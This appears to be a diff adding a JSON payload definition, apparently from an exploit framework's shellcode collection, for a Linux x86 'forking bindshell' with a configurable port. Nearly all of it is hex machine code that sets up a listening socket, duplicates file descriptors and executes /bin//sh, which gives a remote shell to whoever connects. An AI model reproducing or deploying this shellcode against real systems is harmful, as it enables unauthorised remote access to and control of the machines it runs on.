@@ -1,0 +1,38 @@
+{
+	"description" : "forking bindshell, port can be specified",
+	"author"      : "eSDee <esdee@netric.org>",
+	"parameters"  : [
+		{
+			"name"        : "port",
+			"type"        : "u16be",
+			"placeholder" : "b0ef"
+		}
+	],
+	"code" : [
+        "31c031db31c951b1",
+        "0651b10151b10251",
+        "89e1b301b066cd80",
+        "89c131c031db5050",
+        "506668b0efb30266",
+        "5389e2b31053b302",
+        "525189ca89e1b066",
+        "cd8031db39c37405",
+        "31c040cd8031c050",
+        "5289e1b304b066cd",
+        "8089d731c031db31",
+        "c9b311b101b030cd",
+        "8031c031db505057",
+        "89e1b305b066cd80",
+        "89c631c031dbb002",
+        "cd8039c3754031c0",
+        "89fbb006cd8031c0",
+        "31c989f3b03fcd80",
+        "31c041b03fcd8031",
+        "c041b03fcd8031c0",
+        "50682f2f7368682f",
+        "62696e89e38b5424",
+        "08505389e1b00bcd",
+        "8031c040cd8031c0",
+        "89f3b006cd80eb99"
+	]
+}
